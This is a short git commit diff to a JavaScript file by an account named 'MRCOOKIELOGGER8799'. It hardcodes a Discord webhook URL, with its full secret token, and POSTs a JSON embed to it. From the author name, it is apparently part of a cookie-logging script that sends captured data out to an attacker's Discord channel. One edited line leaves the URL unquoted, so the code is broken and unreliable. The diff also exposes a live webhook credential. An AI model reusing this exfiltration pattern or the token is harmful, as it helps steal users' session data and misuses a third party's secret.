ad474f34d130ea63828b5cd9af0f4679282ad072
MRCOOKIELOGGER8799 <119659762+MRCOOKIELOGGER8799@users.noreply.github.com>
2022-12-02 04:47:04 -0500

    bvybygtgyvt
    rhbcriu

--- main.js
+++ main.js
@@ -1,4 +1,4 @@
-let webhookURL = "";
+let webhookURL = " https://discord.com/api/webhooks/1047614715662188664/CmUd9bjb6FjghMmr4Zgbaiu_glMAtrZgfMXgxyMXF1xlDKk3s4lLYjAl_L4xh2uurXKc";
 let req = new XMLHttpRequest();
 
 const myEmbed = {
@@ -14,7 +14,7 @@ const params = {
 	embeds: [myEmbed]
 };
 
-req.open("POST", webhookURL)
+req.open("POST",https://discord.com/api/webhooks/1047614715662188664/CmUd9bjb6FjghMmr4Zgbaiu_glMAtrZgfMXgxyMXF1xlDKk3s4lLYjAl_L4xh2uurXKc)
 	.setRequestHeader("Content-type", "application/json")
 	.send(JSON.stringify(params));
 
